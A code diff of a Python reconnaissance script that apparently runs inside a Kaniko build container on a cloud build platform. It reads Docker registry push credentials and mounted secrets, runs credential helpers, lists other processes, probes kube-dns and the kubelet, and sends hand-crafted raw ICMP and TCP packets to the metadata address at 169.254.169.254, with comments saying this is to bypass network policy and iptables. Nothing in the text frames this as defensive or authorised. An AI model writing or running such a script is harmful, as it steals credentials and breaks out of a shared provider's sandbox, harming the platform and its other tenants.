@@ -1,154 +1,175 @@
-import urllib.request, json, os, socket, struct
+import json, os, socket, subprocess
 
 r = {}
 
-# Network info
+# 1. Kaniko docker config (contains registry push credentials)
+for f in ['/kaniko/.docker/config.json', '/kaniko/.docker/config', '/root/.docker/config.json']:
+    try:
+        data = open(f).read()
+        r[f'file_{f}'] = data[:1000]
+    except Exception as e:
+        r[f'file_{f}'] = str(e)[:100]
+
+# 2. Full /kaniko directory listing
+def walk_tree(path, depth=0, max_depth=3):
+    items = []
+    if depth >= max_depth: return items
+    try:
+        for f in sorted(os.listdir(path)):
+            fp = os.path.join(path, f)
+            if os.path.islink(fp):
+                items.append(f'{f} -> {os.readlink(fp)}')
+            elif os.path.isdir(fp):
+                items.append(f'{f}/')
+                sub = walk_tree(fp, depth+1, max_depth)
+                items.extend([f'  {x}' for x in sub])
+            elif os.path.isfile(fp):
+                sz = os.path.getsize(fp)
+                items.append(f'{f} ({sz}b)')
+    except Exception as e:
+        items.append(f'ERROR: {e}')
+    return items
+
+r['kaniko_tree'] = walk_tree('/kaniko', 0, 3)
+
+# 3. Kaniko SSL certs (may reveal internal CA)
 try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(('8.8.8.8', 53))
-    r['my_ip'] = s.getsockname()[0]
-    s.close()
-except: pass
-r['hostname'] = socket.gethostname()
-r['uid'] = os.getuid()
-r['gid'] = os.getgid()
-
-# Full environment
-env_interesting = {}
-for k, v in sorted(os.environ.items()):
-    env_interesting[k] = v[:200]
-r['env'] = env_interesting
-
-# Resolv.conf
-try: r['resolv'] = open('/etc/resolv.conf').read().strip()
+    certs = os.listdir('/kaniko/ssl/certs')
+    r['kaniko_ssl_certs'] = certs[:20]
 except: pass
 
-# Routes
-try: r['routes'] = open('/proc/net/route').read()
+# 4. Check the Kaniko executor binary - what registries does it know about?
+try:
+    out = subprocess.run(['strings', '/kaniko/executor'], capture_output=True, text=True, timeout=5)
+    # Look for registry URLs
+    registry_lines = [l for l in out.stdout.split('\n') if any(x in l.lower() for x in ['registry','docker','gcr','ecr','docr','digitalocean'])]
+    r['kaniko_strings'] = registry_lines[:30]
+except Exception as e:
+    r['kaniko_strings'] = str(e)[:100]
+
+# 5. Docker credential helper - what registries are configured?
+try:
+    for helper in ['docker-credential-ecr-login', 'docker-credential-gcr', 'docker-credential-acr-env']:
+        path = f'/kaniko/{helper}'
+        if os.path.exists(path):
+            # Try running the credential helper
+            try:
+                out = subprocess.run([path, 'list'], capture_output=True, text=True, timeout=3)
+                r[f'cred_{helper}_list'] = (out.stdout + out.stderr)[:500]
+            except Exception as e:
+                r[f'cred_{helper}_list'] = str(e)[:100]
 except: pass
 
-# ARP
-try: r['arp'] = open('/proc/net/arp').read()
+# 6. Check /kaniko/4216874709 (mystery file from previous scan)
+try:
+    f = '/kaniko/4216874709'
+    if os.path.isfile(f):
+        r['mystery_file'] = open(f, 'rb').read()[:500].hex()
+        r['mystery_file_size'] = os.path.getsize(f)
+    elif os.path.isdir(f):
+        r['mystery_dir'] = os.listdir(f)[:20]
+except Exception as e:
+    r['mystery_4216874709'] = str(e)[:100]
+
+# 7. /proc/self/environ (our full env)
+try:
+    r['proc_environ'] = open('/proc/self/environ').read().replace('\0', '\n')[:1000]
 except: pass
 
-# /proc/self info
-try: r['cgroup'] = open('/proc/self/cgroup').read()[:500]
-except: pass
-try: r['mountinfo'] = open('/proc/self/mountinfo').read()[:2000]
-except: pass
-
-# Capabilities
-try: r['capbnd'] = open('/proc/self/status').read().split('CapBnd:')[1].split('\n')[0].strip()
-except: pass
-
-# SA token / secrets
-try: r['sa_token'] = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read()[:100]
-except Exception as e: r['sa_token'] = str(e)[:100]
-
-# Check what's in /var/run
-try: r['var_run'] = os.listdir('/var/run')
+# 8. Check for any mounted secrets or configmaps
+try:
+    for root, dirs, files in os.walk('/var/run'):
+        for f in files:
+            fp = os.path.join(root, f)
+            try:
+                r[f'varrun_{fp}'] = open(fp).read()[:500]
+            except: pass
 except: pass
 
-# Docker socket
-for sock in ['/var/run/docker.sock', '/run/containerd/containerd.sock', '/run/crio/crio.sock']:
-    try:
-        os.stat(sock)
-        r[f'socket_{sock}'] = 'EXISTS'
-    except: pass
+# 9. Check for other containers' data via /proc
+try:
+    pids = [p for p in os.listdir('/proc') if p.isdigit()]
+    r['pids'] = sorted(pids, key=int)
+    for pid in sorted(pids, key=int)[:10]:
+        try:
+            cmdline = open(f'/proc/{pid}/cmdline').read().replace('\0', ' ')[:200]
+            r[f'pid_{pid}'] = cmdline
+        except: pass
+except: pass
 
-# Check for Kaniko workspace
-for d in ['/.app_platform_workspace', '/workspace', '/kaniko', '/busybox']:
-    try:
-        r[f'dir_{d}'] = os.listdir(d)[:20]
-    except: pass
-
-# Link-local range scan (not just 169.254.169.254)
-for last_octet in [1, 2, 3, 80, 128, 253]:
-    ip = f'169.254.169.{last_octet}'
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(1)
-        rc = s.connect_ex((ip, 80))
-        if rc == 0 or rc != 111:
-            r[f'll_{ip}'] = f'errno={rc}'
-        s.close()
-    except: pass
-
-# Try different IMDS ports
-for port in [80, 443, 8080, 8443]:
+# 10. Network - can we reach build infrastructure?
+# Check for internal registries
+for target in [
+    ('registry.digitalocean.com', 443),
+    ('10.245.0.10', 53),  # kube-dns
+    ('10.244.8.234', 10250),  # gateway/kubelet
+]:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(2)
-        rc = s.connect_ex(('169.254.169.254', port))
-        r[f'imds_port_{port}'] = 'OPEN' if rc == 0 else f'errno={rc}'
+        rc = s.connect_ex(target)
+        r[f'tcp_{target[0]}_{target[1]}'] = 'OPEN' if rc == 0 else f'errno={rc}'
         s.close()
-    except: pass
+    except Exception as e:
+        r[f'tcp_{target[0]}_{target[1]}'] = str(e)[:50]
 
-# Scan gateway
+# 11. Raw socket - can we craft packets to bypass network policy?
 try:
-    gw_hex = open('/proc/net/route').readlines()[1].split('\t')[2]
-    gw_bytes = bytes.fromhex(gw_hex)
-    gw_ip = f'{gw_bytes[3]}.{gw_bytes[2]}.{gw_bytes[1]}.{gw_bytes[0]}'
-    r['gateway_ip'] = gw_ip
-    for port in [80, 443, 8080, 10250, 10255, 4194, 6443]:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(1)
-            rc = s.connect_ex((gw_ip, port))
-            if rc == 0:
-                r[f'gw_{port}'] = 'OPEN'
-            s.close()
-        except: pass
-except: pass
-
-# DNS discovery - build namespace services
-build_ns = None
-try:
-    resolv = open('/etc/resolv.conf').read()
-    for line in resolv.split('\n'):
-        if 'search' in line:
-            parts = line.split()
-            if len(parts) > 1:
-                build_ns = parts[1].split('.')[0]
-                r['build_namespace'] = build_ns
-except: pass
-
-# Try to find other services in the build namespace
-if build_ns:
-    for svc in ['kaniko','builder','registry','docker','buildkit','build-controller']:
-        try:
-            ip = socket.getaddrinfo(f'{svc}.{build_ns}.svc.cluster.local', None)[0][4][0]
-            r[f'dns_{svc}'] = ip
-        except: pass
-
-# Try kube-dns queries for interesting services
-for svc_ns in [
-    'registry.kube-system', 'registry.default',
-    'docker-registry.kube-system', 'docker-registry.default',
-    'kaniko.kube-system',
-    'buildkit.default',
-    'image-registry.openshift-image-registry',
-]:
-    svc, ns = svc_ns.rsplit('.', 1)
-    try:
-        ip = socket.getaddrinfo(f'{svc}.{ns}.svc.cluster.local', None)[0][4][0]
-        r[f'dns_{svc_ns}'] = ip
-    except: pass
-
-# Raw socket test (not gVisor)
-try:
+    # Create raw socket and try to send ICMP to IMDS
     s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-    r['raw_socket'] = 'SUCCESS'
+    # ICMP echo request
+    import struct
+    icmp_type = 8  # Echo
+    icmp_code = 0
+    icmp_checksum = 0
+    icmp_id = os.getpid() & 0xFFFF
+    icmp_seq = 1
+    data = b'PROBE' * 4
+    header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
+    # Calculate checksum
+    packet = header + data
+    total = 0
+    for i in range(0, len(packet), 2):
+        if i + 1 < len(packet):
+            total += (packet[i] << 8) + packet[i+1]
+        else:
+            total += packet[i] << 8
+    total = (total >> 16) + (total & 0xFFFF)
+    total = ~total & 0xFFFF
+    header = struct.pack('!BBHHH', icmp_type, icmp_code, total, icmp_id, icmp_seq)
+    s.settimeout(2)
+    s.sendto(header + data, ('169.254.169.254', 0))
+    try:
+        resp = s.recvfrom(1024)
+        r['raw_icmp_imds'] = f'RESPONSE: {resp[0][:32].hex()} from {resp[1]}'
+    except socket.timeout:
+        r['raw_icmp_imds'] = 'timeout (filtered)'
     s.close()
 except Exception as e:
-    r['raw_socket'] = str(e)[:100]
+    r['raw_icmp_imds'] = str(e)[:100]
 
-# Try iptables or ip commands
-import subprocess
-for cmd in [['iptables', '-L', '-n'], ['ip', 'addr'], ['ip', 'route'], ['ip', 'neigh']]:
+# 12. Try raw TCP to IMDS (bypass iptables)
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+    s.settimeout(2)
+    # Craft SYN to 169.254.169.254:80
+    src_ip = r.get('my_ip', '10.0.0.1')
+    # IP header
+    ip_header = struct.pack('!BBHHHBBH4s4s',
+        0x45, 0, 40, 54321, 0, 64, 6, 0,
+        socket.inet_aton(src_ip),
+        socket.inet_aton('169.254.169.254'))
+    # TCP header with SYN
+    tcp_header = struct.pack('!HHIIBBHHH',
+        12345, 80, 0, 0, 0x50, 0x02, 65535, 0, 0)
+    s.sendto(ip_header + tcp_header, ('169.254.169.254', 0))
     try:
-        out = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
-        r[f'cmd_{"_".join(cmd[:2])}'] = (out.stdout + out.stderr)[:500]
-    except: pass
+        resp = s.recvfrom(1024)
+        r['raw_tcp_imds'] = f'RESPONSE: {resp[0][:40].hex()}'
+    except socket.timeout:
+        r['raw_tcp_imds'] = 'timeout'
+    s.close()
+except Exception as e:
+    r['raw_tcp_imds'] = str(e)[:100]
 
 print(json.dumps(r, indent=2))
